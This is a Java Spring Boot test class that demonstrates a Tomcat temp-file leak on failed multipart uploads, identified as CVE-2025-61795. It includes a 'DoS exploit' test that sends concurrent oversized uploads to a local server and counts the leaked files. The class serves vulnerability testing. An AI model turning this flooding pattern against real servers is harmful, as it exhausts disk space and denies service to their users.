package hello;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.AfterEach;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.boot.test.web.server.LocalServerPort;
import org.springframework.core.io.ClassPathResource;
import org.springframework.http.*;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.context.TestPropertySource;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Test class to demonstrate CVE-2025-61795 vulnerability.
 * 
 * CVE-2025-61795 is an "Improper Resource Shutdown or Release" vulnerability in Apache Tomcat.
 * When multipart uploads fail (e.g., due to size limits), temporary files are created but not
 * immediately deleted, leading to potential disk space exhaustion and DoS.
 * 
 * This test demonstrates:
 * 1. How the vulnerability can be triggered
 * 2. The accumulation of temporary files
 * 3. The potential for DoS through resource exhaustion
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@TestPropertySource(properties = {
    "spring.servlet.multipart.max-file-size=1KB",
    "spring.servlet.multipart.max-request-size=1KB",
    "logging.level.org.apache.tomcat=DEBUG"
})
public class CVE202561795Test {

    @Autowired
    private TestRestTemplate restTemplate;

    @LocalServerPort
    private int port;

    private String baseUrl;
    private Path tempDir;
    private long initialTempFileCount;

    @BeforeEach
    void setUp() throws IOException {
        baseUrl = "http://localhost:" + port;
        tempDir = Paths.get(System.getProperty("java.io.tmpdir"));
        
        // Count initial temporary files
        initialTempFileCount = countTomcatTempFiles();
        System.out.println("Initial Tomcat temp files: " + initialTempFileCount);
    }

    @AfterEach
    void tearDown() {
        // Clean up any test files
        try {
            Files.list(tempDir)
                .filter(path -> path.getFileName().toString().startsWith("tomcat"))
                .forEach(path -> {
                    try {
                        Files.deleteIfExists(path);
                    } catch (IOException e) {
                        // Ignore cleanup errors
                    }
                });
        } catch (IOException e) {
            // Ignore cleanup errors
        }
    }

    /**
     * Test that demonstrates CVE-2025-61795 by triggering file size limit violations.
     * This should create temporary files that are not properly cleaned up.
     */
    @Test
    void testCVE202561795_VulnerabilityTrigger() throws IOException {
        System.out.println("\n=== CVE-2025-61795 Vulnerability Test ===");
        
        // Create a file that exceeds the size limit
        byte[] largeFileContent = new byte[2048]; // 2KB file (exceeds 1KB limit)
        for (int i = 0; i < largeFileContent.length; i++) {
            largeFileContent[i] = (byte) (i % 256);
        }
        
        MockMultipartFile largeFile = new MockMultipartFile(
            "file", 
            "test-large-file.txt", 
            "text/plain", 
            largeFileContent
        );
        
        // Create multipart request
        MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
        body.add("file", largeFile.getResource());
        
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.MULTIPART_FORM_DATA);
        HttpEntity<MultiValueMap<String, Object>> requestEntity = new HttpEntity<>(body, headers);
        
        // Send request that should trigger the vulnerability
        ResponseEntity<Map> response = restTemplate.postForEntity(
            baseUrl + "/api/v1/files/upload", 
            requestEntity, 
            Map.class
        );
        
        // Verify the request was rejected due to size limit
        assertEquals(HttpStatus.PAYLOAD_TOO_LARGE, response.getStatusCode());
        assertTrue(response.getBody().toString().contains("File too large"));
        
        // Wait a moment for any async cleanup (which won't happen due to the vulnerability)
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        // Check if temporary files were created and not cleaned up
        long finalTempFileCount = countTomcatTempFiles();
        long tempFilesCreated = finalTempFileCount - initialTempFileCount;
        
        System.out.println("Initial temp files: " + initialTempFileCount);
        System.out.println("Final temp files: " + finalTempFileCount);
        System.out.println("Temp files created: " + tempFilesCreated);
        
        // The vulnerability means temp files are not immediately cleaned up
        // In a vulnerable system, we should see temp files accumulate
        if (tempFilesCreated > 0) {
            System.out.println("⚠️  CVE-2025-61795 CONFIRMED: " + tempFilesCreated + 
                             " temporary files were created and not cleaned up!");
        } else {
            System.out.println("✅ No temporary files leaked (vulnerability may be patched)");
        }
        
        // Get system info to show resource usage
        ResponseEntity<Map> systemInfo = restTemplate.getForEntity(
            baseUrl + "/api/v1/files/system-info", 
            Map.class
        );
        
        assertEquals(HttpStatus.OK, systemInfo.getStatusCode());
        System.out.println("System info: " + systemInfo.getBody());
    }

    /**
     * Test that demonstrates how an attacker could exploit CVE-2025-61795
     * to cause a Denial of Service through resource exhaustion.
     */
    @Test
    void testCVE202561795_DoSExploit() throws InterruptedException {
        System.out.println("\n=== CVE-2025-61795 DoS Exploit Test ===");
        
        int numberOfRequests = 50; // Number of requests to send
        int threadPoolSize = 10;   // Number of concurrent threads
        
        ExecutorService executor = Executors.newFixedThreadPool(threadPoolSize);
        AtomicInteger successCount = new AtomicInteger(0);
        AtomicInteger errorCount = new AtomicInteger(0);
        
        // Create large file content that will trigger the vulnerability
        byte[] largeFileContent = new byte[2048];
        for (int i = 0; i < largeFileContent.length; i++) {
            largeFileContent[i] = (byte) (i % 256);
        }
        
        // Submit multiple requests concurrently to exploit the vulnerability
        for (int i = 0; i < numberOfRequests; i++) {
            executor.submit(() -> {
                try {
                    MockMultipartFile largeFile = new MockMultipartFile(
                        "file", 
                        "exploit-file-" + System.currentTimeMillis() + ".txt", 
                        "text/plain", 
                        largeFileContent
                    );
                    
                    MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
                    body.add("file", largeFile.getResource());
                    
                    HttpHeaders headers = new HttpHeaders();
                    headers.setContentType(MediaType.MULTIPART_FORM_DATA);
                    HttpEntity<MultiValueMap<String, Object>> requestEntity = new HttpEntity<>(body, headers);
                    
                    ResponseEntity<Map> response = restTemplate.postForEntity(
                        baseUrl + "/api/v1/files/upload", 
                        requestEntity, 
                        Map.class
                    );
                    
                    if (response.getStatusCode() == HttpStatus.PAYLOAD_TOO_LARGE) {
                        successCount.incrementAndGet();
                    } else {
                        errorCount.incrementAndGet();
                    }
                    
                } catch (Exception e) {
                    errorCount.incrementAndGet();
                    System.err.println("Request failed: " + e.getMessage());
                }
            });
        }
        
        // Wait for all requests to complete
        executor.shutdown();
        boolean finished = executor.awaitTermination(30, TimeUnit.SECONDS);
        
        if (!finished) {
            executor.shutdownNow();
        }
        
        System.out.println("DoS exploit test completed:");
        System.out.println("Successful requests (triggered vulnerability): " + successCount.get());
        System.out.println("Failed requests: " + errorCount.get());
        
        // Check final temp file count
        long finalTempFileCount = countTomcatTempFiles();
        long tempFilesCreated = finalTempFileCount - initialTempFileCount;
        
        System.out.println("Initial temp files: " + initialTempFileCount);
        System.out.println("Final temp files: " + finalTempFileCount);
        System.out.println("Temp files created by exploit: " + tempFilesCreated);
        
        if (tempFilesCreated > 0) {
            System.out.println("🚨 DoS EXPLOIT SUCCESSFUL: " + tempFilesCreated + 
                             " temporary files accumulated, potentially causing resource exhaustion!");
        } else {
            System.out.println("✅ No temporary files leaked (vulnerability may be patched)");
        }
        
        // Verify we got the expected number of successful requests
        assertTrue(successCount.get() > 0, "Should have some successful requests that triggered the vulnerability");
    }

    /**
     * Test with a valid file size to ensure normal operation works.
     */
    @Test
    void testValidFileUpload() throws IOException {
        System.out.println("\n=== Valid File Upload Test ===");
        
        // Create a small file that should be accepted
        byte[] smallFileContent = new byte[512]; // 512 bytes (under 1KB limit)
        for (int i = 0; i < smallFileContent.length; i++) {
            smallFileContent[i] = (byte) (i % 256);
        }
        
        MockMultipartFile smallFile = new MockMultipartFile(
            "file", 
            "test-small-file.txt", 
            "text/plain", 
            smallFileContent
        );
        
        MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
        body.add("file", smallFile.getResource());
        
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.MULTIPART_FORM_DATA);
        HttpEntity<MultiValueMap<String, Object>> requestEntity = new HttpEntity<>(body, headers);
        
        ResponseEntity<Map> response = restTemplate.postForEntity(
            baseUrl + "/api/v1/files/upload", 
            requestEntity, 
            Map.class
        );
        
        assertEquals(HttpStatus.OK, response.getStatusCode());
        assertTrue(response.getBody().toString().contains("File uploaded successfully"));
        
        System.out.println("✅ Valid file upload works correctly");
    }

    /**
     * Count Tomcat temporary files in the system temp directory.
     */
    private long countTomcatTempFiles() {
        try {
            return Files.list(tempDir)
                .filter(path -> path.getFileName().toString().startsWith("tomcat"))
                .count();
        } catch (IOException e) {
            return 0;
        }
    }
}
